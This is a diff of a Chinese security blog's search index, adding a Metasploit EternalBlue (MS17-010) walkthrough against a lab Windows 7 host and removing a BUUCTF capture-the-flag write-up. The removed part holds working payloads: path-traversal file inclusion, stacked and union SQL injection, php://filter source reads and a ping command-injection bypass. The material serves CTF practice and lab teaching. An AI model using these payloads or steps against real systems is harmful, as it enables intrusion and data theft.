@@ -1,6 +1,63 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>MSF利用MS17_010渗透内网主机</title>
+    <url>/2020/12/23/MSF%E4%B9%8B%E5%88%A9%E7%94%A8MS17_010%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA/</url>
+    <content><![CDATA[<p>记一次MSF利用MS17_010渗透内网主机</p>
+<a id="more"></a>
+<h2 id="测试环境"><a class="header-anchor" href="#测试环境">¶</a>测试环境:</h2>
+<p>攻击主机:kali-linux-2020</p>
+<p>目标主机:win7主机(测试时关闭了防火墙)</p>
+<pre><code>ip:192.168.94.130
+</code></pre>
+<h2 id="信息搜集"><a class="header-anchor" href="#信息搜集">¶</a>信息搜集</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sT -T4 -A 192.168.94.130</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6b7cd743bf1a63607582b35cf02c8d95.png" alt="Snipaste_2020-12-23_16-40-44.png"></p>
+<p>可以看见开放了 445端口的smb共享文件操作</p>
+<p>所以我们能利用永恒之蓝漏洞进行渗透</p>
+<h2 id="msf的使用"><a class="header-anchor" href="#msf的使用">¶</a>msf的使用</h2>
+<p>开启msf,初次使用需要 <code>msfdb init</code> 初始化一下msf的数据库(msf的数据库是postgresql)</p>
+<p>后面就可以直接使用 msfdb start启动它的数据库了</p>
+<p>启动msf</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<p>可以看到启动成功</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/48d56f67680718424465ea602dd0b4bc.png" alt="Snipaste_2020-12-23_16-44-28.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>
+<p>看一看利用的模块</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/078b80f52bdc70d8443115a7547956c0.png" alt="Snipaste_2020-12-23_16-45-43.png"></p>
+<p>可以先使用辅助模块 auxliar 进行辅助看看是否存在这个漏洞利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010   </span><br></pre></td></tr></table></figure>
+<p><code>options</code>看一下我们需要设置什么payload</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/827f318393361849c45c568110a357ee.png" alt="Snipaste_2020-12-23_16-49-18.png"></p>
+<p>可以看到我们需要设置攻击的ip</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
+<p>然后 <code>run</code>  或者 <code>exploit</code></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/db8072a9eefb03c5da1b3e70b645bb84.png" alt="Snipaste_2020-12-23_16-50-25.png"></p>
+<p>可以看到 可能存在ms17_010漏洞</p>
+<p>接下来我们使用 exploit模块进行 漏洞利用getshell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue </span><br></pre></td></tr></table></figure>
+<p>然后 <code>set payload</code> 可以看到我们只需要设置 rhosts就行了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/813e501f2dd4a2075a3fb7faa6383bc5.png" alt="Snipaste_2020-12-23_16-57-27.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhosts 192.168.94.130</span><br></pre></td></tr></table></figure>
+<p>然后run</p>
+<p>可以看到成功了 进行的是meterpreter了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/91b6d69faf090b7300ab9176cf8f7dcb.png" alt="Snipaste_2020-12-23_17-01-44.png"></p>
+<p>输入shell 可以看到我们成功进入了目标机的cmd了</p>
+<p>ipconfig可以看到一些信息</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0da1dd8e0e5dce75d300652f86564312.png" alt="Snipaste_2020-12-23_17-05-03.png"></p>
+<p><strong>tip:</strong></p>
+<p>cmd中文乱码可以使用 <code>chcp 65001</code> 修改编码 部分中文能成功显示</p>
+<p>在meterpreter可以使用 background放入后台进程</p>
+<p>sessions 命令可以看后台进程</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/52ffa7da36dd2bb68e6094f732b33df3.png" alt="Snipaste_2020-12-23_17-03-38.png"></p>
+<p><strong>其它后渗透参考</strong>  <a href="https://blog.csdn.net/p_utao/article/details/108381939">https://blog.csdn.net/p_utao/article/details/108381939</a></p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+        <category>msf利用</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CTF中常见的黑魔法</title>
     <url>/2020/10/20/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%BB%91%E9%AD%94%E6%B3%95/</url>
     <content><![CDATA[<p>本文也可以说是常见php特性考察的总结</p>
@@ -78,209 +135,6 @@
       <categories>
         <category>web技术学习</category>
         <category>常见黑魔法</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Buuctf刷题记录</title>
-    <url>/2021/01/12/Buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-0/</url>
-    <content><![CDATA[<h1>Buuctf刷题记录</h1>
-<h2 id="HCTF-2018-WarmUp"><a class="header-anchor" href="#HCTF-2018-WarmUp">¶</a>[HCTF]2018 WarmUp</h2>
-<p>要不是我脸皮厚 第一题就能把我劝退 🙂</p>
-<p>右键源代码得到提示</p>
-<p>访问source.php 得到源码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);</span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-<p>先根据提示的 hint.php 得到信息</p>
-<p><code>flag not here, and flag in ffffllllaaaagggg</code></p>
-<p>看看几个需要知道的函数</p>
-<p>1.mb_substr()</p>
-<p><img src="https://img-blog.csdnimg.cn/20210114212509625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>2.mb_strpos</p>
-<p><img src="https://img-blog.csdnimg.cn/20210114212747465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>先分析 emmm这个类</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class emmm</span><br><span class="line">&#123;</span><br><span class="line">    public static function checkFile(&amp;$page)</span><br><span class="line">    &#123;</span><br><span class="line">        $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">        if (! isset($page) || !is_string($page)) &#123;  &#x2F;&#x2F;page必须不为空或为字符串</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (in_array($page, $whitelist)) &#123;  &#x2F;&#x2F;in_array()检测page是否在whitelist中</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page &#x3D; mb_substr(  &#x2F;&#x2F;如果page含有?，则获取page第一个?前的值并赋给_page变量</span><br><span class="line">            $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;  &#x2F;&#x2F;检测_page是否在whitelist中</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page &#x3D; urldecode($page);  &#x2F;&#x2F;给_page二次赋值，使其等于URL解码之后的page</span><br><span class="line">        $_page &#x3D; mb_substr(&#x2F;&#x2F;得到hint(source).php</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)  &#x2F;&#x2F;如果_page有?，则截取_page(URL解码后的page)两个?中间的值</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;  &#x2F;&#x2F;检测_page是否在whitelist中</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到函数代码中有四个if语句：</p>
-<p><em><strong>第一个if语句</strong></em> 对变量进行检验，要求$page为字符串，否则返回false <em>//因为返回False所以这里无用</em><br>
-<em><strong>第二个if语句</strong></em> 判断$page是否存在于$whitelist数组中，存在则返回true<br>
-<em><strong>第三个if语句</strong></em> 判断截取后的$page是否存在于$whitelist数组中，截取$page中’?'前部分，存在则返回true<br>
-<em><strong>第四个if语句</strong></em> 判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true<br>
-若以上四个if语句均未返回值，则返回false</p>
-<p>有三个if语句可以返回true，第二个语句直接判断$page，不可用</p>
-<p>第三个语句截取’?'前部分，由于?被后部分被解析为get方式提交的参数，也不可利用</p>
-<p>第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?'，仍可通过第四个if语句校验。</p>
-<p><strong>只要这四个if语句有一个为true即可包含file</strong>，关键点在_page 经过截断后返回true.</p>
-<p>所以我们的突破点就在于第四个if语句中，只要满足他的条件，我们就可以包含文件：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_page &#x3D; urldecode($page); </span><br><span class="line">$_page &#x3D; mb_substr(</span><br><span class="line">　　$_page,</span><br><span class="line">　　0,</span><br><span class="line">　　mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) &#x2F;&#x2F;得到hint(source).php的最后位置</span><br><span class="line">);if (in_array($_page, $whitelist)) &#123; </span><br><span class="line">　　return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里URL解码了一次$page值，这里需要注意的是，<em><strong>PHP中$_GET、$_POST、$_REQUEST这类函数在提取参数值时会URL解码一次</strong></em></p>
-<p>而这里在代码中又一次URL解码了一次，共计解码了两次，所以我们也需要对传入的值进行两次URL编码</p>
-<p>其次我们的突破点就在于这段代码只会截取?之前的字符串拿去和whitelist比对，因此只要确保?前的值是source.php或hint.php即可返回true</p>
-<p>等同于 /source.php?file=source.php%253Fxxxx 便可以使用include()函数包含 source.php?xxxx 这个文件(%253f是?URL编码两次后的值)</p>
-<p>所以可以构造Payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?file&#x3D;source.php%253F&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-<p>需要注意的是，这里之所以可以包含到ffffllllaaaagggg是因为PHP将 source.php%253F/ 视作了一个文件夹，然后 …/ 的用途是返回上级目录</p>
-<p>ffffllllaaaagggg位于根目录下，一般Web服务的文件夹在/var/www/html目录中，再加上source.php?/这个“文件夹”，所以我们总共需要…/四次来返回到根目录  当然你也可以用…/更多次 毕竟是在根目录</p>
-<p>参考:<a href="https://www.cnblogs.com/yesec/p/12635274.html">https://www.cnblogs.com/yesec/p/12635274.html</a></p>
-<h2 id="强网杯-2019随便注"><a class="header-anchor" href="#强网杯-2019随便注">¶</a>[强网杯]2019随便注</h2>
-<p>单引号试探</p>
-<p><img src="https://img-blog.csdnimg.cn/20210114141920393.png" alt="在这里插入图片描述"></p>
-<p>然后 1’# 成功回显，发现并没有过滤注释符</p>
-<p><code>1'order by 2#</code>检测发现两个字段</p>
-<p>使用联合注入的时候发现大部分的注入方法都被过滤了</p>
-<p><img src="https://img-blog.csdnimg.cn/20210114141947895.png" alt="在这里插入图片描述"></p>
-<p>用sqlmap跑了一下得到库名: supersqli</p>
-<p>后面发现可以使用堆叠注入</p>
-<p>查出表名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show tables from supersqli;#</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210114142009224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>查字段名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from words;#</span><br></pre></td></tr></table></figure>
-<p>这个表好像没什么可以用的信息,有两个字段  id和data</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>
-<p>注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p>
-<p>eg.  mysql&gt; SELECT * FROM   <code>table</code>   WHERE  <code>id</code> = ‘123’ ;</p>
-<p>1919810931114514必须用反单引号括起来，但是words不需要，我也不知道为什么,向大佬求解</p>
-<p>这个表中发现字段flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20210114142029194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>之前不是通过 order by查询是有两个字段吗 ,可以猜测到现在sql语句查询的是word这个表里面的数据</p>
-<p>接下来就是用各种膜拜大佬们的wp,下面这个是很骚的解法</p>
-<h3 id="解法一-改名"><a class="header-anchor" href="#解法一-改名">¶</a>解法一:改名</h3>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1&#39; or 1&#x3D;1#爆出表所有内容就可以查flag啦</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改表名:RENAME TABLE &lt;旧表名&gt; TO &lt;新表名&gt;;</span><br><span class="line">修改字段名:alter table &lt;表名&gt; change &lt;字段名&gt; &lt;字段新名称&gt; &lt;字段的类型&gt;</span><br></pre></td></tr></table></figure>
-<p><strong>payload:</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;;alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; VARCHAR(50);#</span><br></pre></td></tr></table></figure>
-<p>然后 <code>1' or 1=1 #</code> 爆出flag</p>
-<h3 id="解法二-预处理语句-堆叠注入"><a class="header-anchor" href="#解法二-预处理语句-堆叠注入">¶</a>解法二:预处理语句+堆叠注入</h3>
-<p>先了解预处理语句</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字供之后调用</span><br><span class="line">EXECUTE ：执行命令</span><br><span class="line">DEALLOCATE PREPARE：释放命令</span><br></pre></td></tr></table></figure>
-<p>测试</p>
-<p><img src="https://img-blog.csdnimg.cn/20210114142049172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;set @sql&#x3D;concat(&#39;s&#39;,&#39;elect &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;#</span><br></pre></td></tr></table></figure>
-<p>或者</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;SET @sqli&#x3D;concat(char(115,101,108,101,99,116),&#39;* from &#96;1919810931114514&#96;&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
-<p>参考:<a href="https://www.jianshu.com/p/6c6a44517dd7">https://www.jianshu.com/p/6c6a44517dd7</a></p>
-<h2 id="极客大挑战-2019-EasySQL"><a class="header-anchor" href="#极客大挑战-2019-EasySQL">¶</a>[极客大挑战] 2019 EasySQL</h2>
-<p>测试得到是单引号闭合</p>
-<p>万能密码就能爆出flag</p>
-<p><strong>payload:</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uername:-1</span><br><span class="line">password: 1&#39;or 1 &#x3D;1%23</span><br></pre></td></tr></table></figure>
-<h2 id="极客大挑战-2019-Havefun"><a class="header-anchor" href="#极客大挑战-2019-Havefun">¶</a>[极客大挑战]2019 Havefun</h2>
-<p>查看源码,发现代码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$cat&#x3D;$_GET[&#39;cat&#39;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123;</span><br><span class="line">echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
-<p>原来感觉是命令执行…随便穿了一个dog就出flag了。。。。</p>
-<h2 id="SUCTF-2019-EasySQL"><a class="header-anchor" href="#SUCTF-2019-EasySQL">¶</a>[SUCTF 2019]EasySQL</h2>
-<p>尝试看看 查询当前数据库名</p>
-<p><img src="https://ae01.alicdn.com/kf/U85c1a3fe2bba44bd97aa4c685f4285d5R.jpg" alt=""></p>
-<p>测试可以发现我们输入数据的位置应该在  select x,x,x from aaaaaa 的 x 位置</p>
-<p>输入 *,1 尝试 直接读出来了。。。。。估计是非预期</p>
-<p>接着我尝试堆叠注入  <code>1;show tables;</code> 发现flag这个表,再去读的时候发现过滤了 from。。。不会了 看看大佬的wp吧</p>
-<p>内置的sql语句为<code>sql =&quot;select&quot;.post[‘query’].&quot;||flag from Flag&quot;;</code></p>
-<p>payload:</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>补充系统变量@@sql_modesql_mode：是一组mysql支持的基本语法及校验规则<br>
-PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p>
-<p>将sql_mode设置为PIPES_AS_CONCAT的话，||就不再是逻辑or了，而变成了字符串连接符。<br>
-因此设置之后<code>select 1||flag from Flag</code>就变成了将<code>select 1 from Flag</code>和<code>select flag from Flag</code>的结果拼接到一起了。而且使用字母连接会报错，使用数字连接才会查询出数据。</p>
-<p>本地测试一下:</p>
-<p><img src="https://ae01.alicdn.com/kf/U265bf89c1aa54e8bb93494551df95390F.jpg" alt=""></p>
-<h2 id="ACTF2020-新生赛-Include"><a class="header-anchor" href="#ACTF2020-新生赛-Include">¶</a>[ACTF2020]新生赛 Include</h2>
-<p>打开题目 tips</p>
-<p>发现地址栏有个file参数 明显的文件包含</p>
-<p>尝试读取  …/…/…/…/…/etc/passwd  ,可以成功</p>
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h2 id="极客大挑战-2019-Secret-File"><a class="header-anchor" href="#极客大挑战-2019-Secret-File">¶</a>[极客大挑战]2019 Secret File</h2>
-<p>打开题目右键查看源码</p>
-<p>发现 Archi ve_room.php</p>
-<p>然后 点进去源码又发现action.php</p>
-<p>然后会重定向到 end.php</p>
-<p>bp抓包 发现 secr3t.php  发现源码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-<p>伪协议读取得到flag</p>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h2 id="极客大挑战-2019-LoveSQL"><a class="header-anchor" href="#极客大挑战-2019-LoveSQL">¶</a>[极客大挑战]2019 LoveSQL</h2>
-<p>打开题目 order by发现字段为3</p>
-<p>查表: 有两个</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;d&amp;password&#x3D;1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210114165135624.png" alt="在这里插入图片描述"></p>
-<p>查表 l0ve1ysq1 的列名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;d&amp;password&#x3D;1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;l0ve1ysq1&#39;%23</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210114165050773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>查数据得到flag  但是我竟然蠢到用 limit 读取。。。。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;password&#x3D;1&#39; union select 2,2,password from &#96;l0ve1ysq1&#96; limit 15,1%23</span><br></pre></td></tr></table></figure>
-<p>可以用 group_concat</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;password&#x3D;1&#39; union select 2,2,group_concat(password) from &#96;l0ve1ysq1&#96;%23</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">group_concat()函数</span><br><span class="line">1、功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</span><br><span class="line">2、语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc&#x2F;desc  ] [separator &#39;分隔符&#39;] )</span><br><span class="line">说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</span><br></pre></td></tr></table></figure>
-<h2 id="GXYCTF2019-Ping-Ping-Ping"><a class="header-anchor" href="#GXYCTF2019-Ping-Ping-Ping">¶</a>[GXYCTF2019]Ping Ping Ping</h2>
-<p>打开题目发现是rce</p>
-<p>尝试读取:  没有过滤分号</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;ls</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210114234736150.png" alt="在这里插入图片描述"></p>
-<p>直接cat flag.php 不行 估计是flag被过滤了使用变量拼接  发现空格被过滤 使用 $IFS$9 绕过</p>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$9fla$a.php</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>刷题站</category>
-        <category>buuctf</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>MSF利用MS17_010渗透内网主机</title>
-    <url>/2020/12/23/MSF%E4%B9%8B%E5%88%A9%E7%94%A8MS17_010%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA/</url>
-    <content><![CDATA[<p>记一次MSF利用MS17_010渗透内网主机</p>
-<a id="more"></a>
-<h2 id="测试环境"><a class="header-anchor" href="#测试环境">¶</a>测试环境:</h2>
-<p>攻击主机:kali-linux-2020</p>
-<p>目标主机:win7主机(测试时关闭了防火墙)</p>
-<pre><code>ip:192.168.94.130
-</code></pre>
-<h2 id="信息搜集"><a class="header-anchor" href="#信息搜集">¶</a>信息搜集</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sT -T4 -A 192.168.94.130</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/6b7cd743bf1a63607582b35cf02c8d95.png" alt="Snipaste_2020-12-23_16-40-44.png"></p>
-<p>可以看见开放了 445端口的smb共享文件操作</p>
-<p>所以我们能利用永恒之蓝漏洞进行渗透</p>
-<h2 id="msf的使用"><a class="header-anchor" href="#msf的使用">¶</a>msf的使用</h2>
-<p>开启msf,初次使用需要 <code>msfdb init</code> 初始化一下msf的数据库(msf的数据库是postgresql)</p>
-<p>后面就可以直接使用 msfdb start启动它的数据库了</p>
-<p>启动msf</p>
